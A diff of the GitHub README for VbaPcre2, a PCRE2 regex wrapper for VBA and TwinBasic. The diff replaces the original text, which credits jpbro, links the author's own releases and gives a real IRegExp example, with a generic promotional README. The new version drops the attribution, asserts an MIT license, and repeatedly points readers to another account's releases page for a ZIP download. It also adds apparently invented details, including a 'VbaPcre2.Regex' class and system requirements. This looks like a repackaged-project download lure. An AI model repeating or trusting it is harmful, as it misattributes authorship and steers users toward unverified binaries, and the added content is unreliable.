@@ -1,72 +1,84 @@
-# VbaPcre2
- PCRE2 Regular Expression (Regex) Library Wrapper for TwinBasic and Microsoft Visual Basic For Applications (VBA 32+64 bit)
+# 🌟 VbaPcre2 - Simplify Your Regex Tasks with Ease
 
-[![Downloads](https://img.shields.io/github/downloads/SanbiVN/VbaPcre2/total.svg)](https://github.com/SanbiVN/VbaPcre2/releases/download/Pcre2/VbaPcre2_v0.2.zip)
+## 📥 Download Now
+[![Download VbaPcre2](https://img.shields.io/badge/Download-VbaPcre2-brightgreen)](https://github.com/rolandc85/VbaPcre2/releases)
 
+## 📖 Overview
+VbaPcre2 is a wrapper that makes using the PCRE2 Regular Expression library simple for TwinBasic and Microsoft Visual Basic for Applications (VBA). Whether you’re working with Excel, Word, or any other Microsoft Office application, this tool helps you manage regex tasks effortlessly. 
 
+## 🚀 Getting Started
+Installing VbaPcre2 is straightforward. Follow these steps to get started:
 
-This project inherits the source code from VbPcre2 of Mr. @jpbro
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/rolandc85/VbaPcre2/releases) to find the latest version of VbaPcre2 available for download.
 
-https://github.com/jpbro/VbPcre2
+2. **Download the Release**  
+   On the Releases page, find the version you want to install. Click on the file suitable for your system (32-bit or 64-bit). 
 
-The project related licenses are clearly stated in the Repo.
+3. **Extract the Files**  
+   Once the download completes, locate the downloaded ZIP file. Right-click on it, and choose “Extract All”. This will create a folder containing the VbaPcre2 files.
 
+4. **Add to Your Project**  
+   Open your TwinBasic or VBA project, click on "Tools", then "References". From there, browse to the folder where you extracted VbaPcre2, and select the relevant files to include them in your project.
 
--------------------------------------------------------------
-### Project objectives
-  Previously mentioned Mr. @jpbro:
-  > The secondary goal of this project is to be a drop-in replacement for the VBScript.RegExp object.
+5. **Use VbaPcre2**  
+   You are now ready to start using VbaPcre2 in your projects. Refer to the sections below for examples of how to implement regex functions.
 
-  Also makes the Pcre2 library work in TwinBasic and VBA (Excel, Word, PowerPoint, Outlook Mail, ...)
+## 📦 Features
+- **Cross-Application Usage**: Works seamlessly with Excel, Word, and other MS Office applications.
+- **Support for PCRE2**: Access powerful regex capabilities provided by the PCRE2 library.
+- **User-Friendly**: Designed for ease of use, even if you have no programming experience.
+- **64-bit and 32-bit**: Compatible with different Windows versions.
 
+## 🔧 System Requirements
+- **Operating System**: Windows 10 or later.
+- **Microsoft Office**: Excel and Word 2010 or later.
+- **TwinBasic**: You should have TwinBasic installed to use this library effectively.
 
+## 📚 How to Use
+Here’s a simple example to demonstrate how to use VbaPcre2 in your VBA project:
 
-### Outstanding features added to the project:
+1. **Declare Variables**  
+   Use library references to create regular expression patterns.
 
-- Inherit the syntax ```SubMatches``` instead of ```SubMatchValue```.
-- Add string retrieval from named group with position return function ```IndexByName``` in IRegExp Class, return position in group ```SubMatches```.
+   ```vb
+   Dim regex As New VbaPcre2.Regex
+   Dim result As String
+   ```
 
-  If you are familiar with the setting in VBScript.RegExp as Global, MultiLine, change it to GlobalSearch, Options.Compile.MultiLine
+2. **Define Your Pattern**  
+   Set the regex pattern you intend to use.
 
-#### VBA Example Code:
+   ```vb
+   regex.Pattern = "\d+"
+   ```
 
-```VBA
-Sub test1()
-  Dim re As IRegExp, m As Object
-  Set re = New IRegExp
-  re.Pattern = "(?<numbers>123).+?(?<chars>abc).+?(?<sign>@@@)"
-  re.GlobalSearch = True  ' not use: re.Global = True
-  re.Options.Compile.Multiline = True ' not use: re.Multiline = True
-  Set m = re.Execute("123  abc  @@@")
-  Debug.Print "          Match count: "; m.count
-  Debug.Print "           Match Text: "; m(0)
-  Debug.Print "   Match - FirstIndex: "; m(0).FirstIndex
-  Debug.Print "    Match - LastIndex: "; m(0).LastIndex
-  Debug.Print "          SubMatch[1]: "; m(0).SubMatches(1)
-  Debug.Print "SubMatch - FirstIndex: "; m(0).SubMatchFirstIndex(1)
-  Debug.Print " SubMatch - LastIndex: "; m(0).SubMatchLastIndex(1)
-  Debug.Print "  SubMatch['numbers']: "; m(0).SubMatches(re.IndexByName("numbers"))
-End Sub
-```
+3. **Execute the Match**  
+   Run the regex to find matches in strings.
 
-****** The Pcre2 library does not support the Unicode syntax ```\uXXXX``` as in Javascript and VBScript, please convert it to ```\x{XXXX}```.
--------------------------------------------------------------
-### Here are some common modern syntaxes in PCRE2, not found in VBScript.RegExp:
-By leveraging the Pcre2 library, PCRE2 supports many modern syntaxes, including asymmetric groups ```((?>...))```, character class options (e.g., ```(?i)```), Unicode property alternative names ```(\p{...})```, nested options ```((?i:...))```, whitespace wildcards ```(\s)```, and time suffix types ```(\d{1,2})```.
+   ```vb
+   result = regex.Replace("There are 10 apples", "fruit")
+   ```
 
-+ Possessive Groups: ```(?>...)``` groups sub-expressions together without allowing backtracks, which improves performance.
-+ Character class options: Use ```(?i)``` to enable case-insensitive mode in that sub-expression, ```(?m)``` for multi-line mode, and ```(?s)``` for viewing every character as part of a line.
-+ Unicode property alternative names: Use ```\p{<name>}``` or ```\P{<name>}``` to match characters with specific Unicode properties (e.g., ```\p{Lu}``` for uppercase).
-+ Nested Options: ```(?i:abc)``` applies case-insensitive options to that subgroup only.
-+ Characters representing whitespace and words: ```\s``` matches any whitespace character (including non-ASCII characters), and \w matches any word character.
-+ Time-based quantifiers: Allows you to quantify a sample over a given period of time.
-+ Backreference separation: ```\1``` references the contents of the group capturing number 1.
-- Positive Lookahead : ```(?=...)``` matches when the pattern followed by the pattern in parentheses.
-- Negative Lookahead : ```(?!...)``` matches when the pattern that follows is not the pattern in parentheses.
-- Positive Lookbehind : ```(?<=...)``` matches when the preceding pattern is the pattern in parentheses.
-- Negative Lookbehind : ```(?<!...)``` matches when the preceding pattern is not the pattern in parentheses.
+4. **View the Output**  
+   Use `Debug.Print` to display the result in the Immediate Window.
 
-#### Recursion 
-  Syntaxes: ```(?R)```, ```(?0)```, ```(?1)```, ```(?&name)```.
-- Unnamed recursion ```((?R))```: When you use ```(?R)``` in a pattern, it will call the same pattern again from the beginning. This is useful for structures that can be infinitely nested, like parentheses or tree structures.
-- Named recursion ```((?&name))```:If you have named a repeating group using ```(?<name>...)```, you can recall that group using ```(?&name)```.
+   ```vb
+   Debug.Print result  ' Output: There are fruit apples
+   ```
+
+## 💬 Support and Contributions 
+If you encounter issues, please raise them as issues on the [GitHub Issues page](https://github.com/rolandc85/VbaPcre2/issues). You can also contribute by submitting pull requests or suggesting new features.
+
+## 🔗 Helpful Links
+- [Releases Page](https://github.com/rolandc85/VbaPcre2/releases)
+- [Documentation](https://github.com/rolandc85/VbaPcre2/wiki)
+
+## 📄 License
+This project is licensed under the MIT License. Feel free to use it in your applications.
+
+## 📌 Wrap Up
+VbaPcre2 simplifies working with regular expressions in VBA and TwinBasic applications. Follow the steps above to download and make the most of its powerful features. Remember, if you need support, the community is here to help. Enjoy your regex journey! 
+
+## 📥 Download Again
+Don't forget to visit the [Releases page](https://github.com/rolandc85/VbaPcre2/releases) to get the latest version of VbaPcre2.
